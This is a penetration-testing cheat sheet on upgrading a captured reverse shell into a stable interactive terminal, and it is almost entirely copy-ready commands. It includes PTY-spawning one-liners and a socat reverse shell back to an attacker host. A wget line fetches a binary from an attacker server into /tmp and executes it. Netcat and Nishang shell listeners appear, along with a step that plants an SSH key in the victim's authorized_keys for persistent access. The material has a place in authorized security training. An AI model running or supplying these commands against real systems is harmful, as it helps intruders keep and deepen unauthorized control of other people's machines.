# Shell Upgrade & Stabilization

Techniques for upgrading limited shells to fully interactive TTYs.

## The Problem

When you get a reverse shell, it's often a "dumb" shell:
- No tab completion
- No arrow keys (up for history)
- Ctrl+C kills your shell
- No clear screen
- Some commands don't work

---

## Quick Upgrade (Python)

```bash
# Step 1: Spawn PTY
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
Ctrl+Z

# Step 3: Configure your terminal
stty raw -echo; fg

# Step 4: Set environment variables (in the shell)
export TERM=xterm
export SHELL=bash
```

> [!TIP]
> If you have issues, try: `reset` after `fg` command

---

## Other Upgrade Methods

### Using script
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Using expect
```bash
expect -c 'spawn bash; interact'
```

### Using Perl
```bash
perl -e 'exec "/bin/bash"'
```

### Using Ruby
```bash
ruby -e 'exec "/bin/bash"'
```

---

## Full TTY with Socat

### Attacker (Listener)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Target
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:4444
```

### One-liner (if socat not on target)
```bash
# Download socat statically compiled
wget http://<attacker>/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:4444
```

---

## Fix Terminal Size

After upgrading, fix the terminal dimensions:

```bash
# On your local machine (before connecting)
stty size
# Output: 40 177 (rows columns)

# On the target shell
stty rows 40 cols 177
```

---

## Windows Shells

### ConPTY (Windows 10+)
```bash
# Use rlwrap for better experience
rlwrap nc -lvnp 4444
```

### PowerShell Upgrade
```powershell
# Already have PTY capabilities in PowerShell
# Use Invoke-PowerShellTcp from Nishang for better shell
```

---

## SSH for Shell Upgrade

If SSH is available:

```bash
# Generate SSH key
ssh-keygen -f key

# Add to target's authorized_keys
echo "<public_key>" >> ~/.ssh/authorized_keys

# SSH in with full TTY
ssh -i key user@target
```

---

## Troubleshooting

| Problem | Solution |
|:--------|:---------|
| Python not found | Try `python3`, `python2.7` |
| PTY spawn doesn't work | Try `/bin/sh` instead of `/bin/bash` |
| Terminal looks broken | Run `reset` command |
| Can't type after `stty raw -echo` | Type `fg` blindly and press Enter |
| Shell exits on Ctrl+C | Upgrade wasn't complete |

---

## Quick Reference

```bash
# Fast upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
